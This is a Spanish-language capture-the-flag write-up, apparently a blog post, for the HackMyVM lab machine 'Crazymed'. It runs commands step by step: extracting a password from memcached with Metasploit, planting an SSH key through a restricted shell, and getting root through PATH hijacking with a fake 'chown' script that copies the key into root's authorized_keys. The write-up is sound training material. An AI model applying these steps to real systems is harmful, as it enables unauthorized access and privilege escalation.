---
layout: post
title: Crazymed - Hackmyvm
tags: [ctf, hackmyvm]
---

**Autor**: Cromiphi \\
**Dificultad**: Fácil

![img](/imgs/write-ups/hackmyvm/crazymed/crazymed_1.png#center)

## Reconocimiento

Comienzo con un escaneo básico de la máquina para ver que puertos tiene abiertos.

```
$ sudo nmap -p- 192.168.1.73                
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-12 13:26 EST
Nmap scan report for 192.168.1.73
Host is up (0.00016s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
4444/tcp  open  krb524
11211/tcp open  memcache
MAC Address: 08:00:27:E7:7F:4E (Oracle VirtualBox virtual NIC)
```

### 11211 (memcache)

En este caso comienzo enumerando el puerto 11211. Para esto uso el siguiente módulo de metasploit con el cual obtengo una contraseña.

```
msf6 auxiliary(gather/memcached_extractor) > run

[+] 192.168.1.73:11211    - Found 4 keys

Keys/Values Found for 192.168.1.73:11211
========================================

 Key            Value
 ---            -----
 conf_location  "VALUE conf_location 0 21\r\n/etc/memecacched.conf\r\nEND\r\n"
 domain         "VALUE domain 0 8\r\ncrazymed\r\nEND\r\n"
 log            "VALUE log 0 18\r\npassword: cr4zyM3d\r\nEND\r\n"
 server         "VALUE server 0 9\r\n127.0.0.1\r\nEND\r\n"

[+] 192.168.1.73:11211    - memcached loot stored at /home/kali/.msf4/loot/20221212133429_default_192.168.1.73_memcached.dump_904823.txt
```
### 4444

Al conectarme al puerto 4444 mediante "nc" me pide una contraseña. Introduzco la que encontré anteriormente y me permite ejecutar varios comandos:

```
Welcome to the Crazymed medical research laboratory.
All our tests are performed on human volunteers for a fee.


Password: cr4zyM3d
Access granted.

Type "?" for help.

System command: ?
Authorized commands: id who echo clear 

System command: id                                                                      
uid=1000(brad) gid=1000(brad) groups=1000(brad),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),112(bluetooth)
```

## Explotación

Esta terminal se está ejecutando como el usuario brad así que usando el comando "echo" voy a crear el archivo .ssh/authorized_keys para poder conectarme mediante ssh. Primero genero un par de claves con "ssh-keygen" y despues copio el id_rsa.pub al servidor.

```
System command: echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCa2XHn7uAFJ+3jhVE9GjEVO3YMkSq89n8kmYqeh7+zB09ZJ8kAazsJKphSiq/9vA8SOzPWwwqWoNCZ+lf1/i5YSxdeKnBbsRJwp2A58PxW4KkxEn4B4pzkfr7d1wkhY0/wvRzLVQKaSAnwp0RcGul4LSAFBVTaJLRTzVxaH27Wxi1vTSGBaujvk1FznCkMjKjgFvtnO2iXe5wMTlkQ1iQQ9XpHu1OQaBXKHJ0tNFFYa7lpiIuw7PE1Vs9aIBl4qbB1jKJUqtMxMtJITO1c+MP/aXW9n7O4UjqDyPr4V06ci5PDW7E7dyqQsvu0cBHZpnn5qUPq3UPYKOc1c/9t9cKuoy0liO/u/9vK4L3G782CUTxXi8yF42DaKc72qi2oZJ1wdD8pOPK0dEQju/yfwzORgkconrcp390AzJJjvcISsHKk6HPQ7juLm3ahEPB8qCabJx/t8pI99E47Q5SwW3R9lO8jL5S4PfvYK3VkMAEnBMA/jqd17vrleqkzJyYuVP8= kali@kali" > /home/brad/.ssh/authorized_keys
```

```
$ ssh brad@192.168.1.73 -i id_rsa
[...]
brad@crazymed:~$
```

## Escalado de Privilegios

Enumerando la máquina encuentro que el usuario brad tiene permisos de escritura en el directorio "/usr/local/bin" y usando "pspy64" descubro que se ejecuta /opt/check_VM cada minuto como el usuario root.

/opt/check_VM:
```
#! /bin/bash

#users flags
flags=(/root/root.txt /home/brad/user.txt)
for x in "${flags[@]}"
do
if [[ ! -f $x ]] ; then
echo "$x doesn't exist"
mcookie > $x
chmod 700 $x
fi
done

chown -R www-data:www-data /var/www/html

#bash_history => /dev/null
home=$(cat /etc/passwd |grep bash |awk -F: '{print $6}')

for x in $home
do
ln -sf /dev/null $x/.bash_history ; eccho "All's fine !"
done


find /var/log -name "*.log*" -exec rm -f {} +
```

En este caso realizo un "path hijacking" dado que no se expecifican las rutas absolutas de los comandos.

```
brad@crazymed:/usr/local/bin$ touch chown
brad@crazymed:/usr/local/bin$ cat chown
cp /home/brad/.ssh/authorized_keys /root/.ssh/authorized_keys
```
De esta forma cuando se ejecute "check_VM", root copiará la clave que le pasé anteriormente a brad para poder utilizarla tambien con root. Despues de un poquito, puedo usar ssh para conectarme a la máquina como el usuario root.

```
$ ssh root@192.168.1.73 -i id_rsa
[...]
root@crazymed:~# :)

```

Muchas gracias  **Cromiphi** por esta máquina.
